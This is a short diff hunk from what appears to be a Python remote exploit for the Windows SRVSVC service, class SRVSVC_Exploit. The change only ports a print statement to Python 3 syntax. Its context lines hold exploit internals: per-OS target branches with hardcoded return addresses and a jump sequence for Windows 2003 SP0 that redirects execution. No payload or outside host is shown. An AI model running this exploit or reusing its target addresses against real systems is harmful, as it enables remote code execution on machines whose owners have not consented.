@@ -132,7 +132,7 @@ class SRVSVC_Exploit(Thread):
             ret = "\xb0\x1c\x1f\x00"
             jumper = nonxjmper % (ret, ret)
         elif (self.os == '3'):
-            print 'Windows 2003 SP0 Universal\n'
+            print ('Windows 2003 SP0 Universal\n')
             ret = "\x9e\x12\x00\x01"  # 0x01 00 12 9e
             jumper = nonxjmper % (ret, ret)
         elif (self.os == '4'):
